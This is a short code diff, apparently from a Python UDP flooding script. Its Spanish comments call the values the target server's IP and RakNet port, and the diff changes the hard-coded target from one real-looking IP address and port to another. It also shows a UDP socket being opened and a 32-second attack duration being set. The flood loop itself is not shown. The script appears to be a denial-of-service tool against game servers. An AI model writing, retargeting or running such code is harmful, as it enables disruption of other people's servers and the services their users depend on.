@@ -2,8 +2,8 @@ import struct
 import time
 import socket
 
-ip = "144.76.58.217"      # Cambia por la IP del servidor objetivo
-port = 31009          # Cambia por el puerto del servidor RakNet
+ip = "163.5.120.163"      # Cambia por la IP del servidor objetivo
+port = 25535          # Cambia por el puerto del servidor RakNet
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 end_time = time.time() + 32  # Duración: 32 segundos
